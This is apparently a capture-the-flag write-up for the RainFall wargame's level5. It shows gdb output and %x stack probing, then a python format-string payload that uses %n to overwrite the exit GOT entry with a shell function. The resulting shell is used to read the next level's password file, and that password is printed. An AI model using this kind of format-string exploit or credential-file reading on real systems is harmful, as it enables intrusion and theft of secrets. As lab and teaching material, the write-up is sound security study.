we can see that we have a function o() that execute
```  system("/bin/sh"); ```

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o -> addresse of o in decimal 134513824 
0x080484c2  n
0x08048504  main```


```
level5@RainFall:~$ ./level5 
AAAAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 
AAAAAA 200 b7fd1ac0 b7ff37d0 41414141 25204141 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 
```
A is in 4th argument

```
*------------------
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
   ```

python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824c" + "%4$n"' > input.txt
cat input.txt - | ./level5 
                                                                          
  whoami
level6
pwd
/home/user/level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31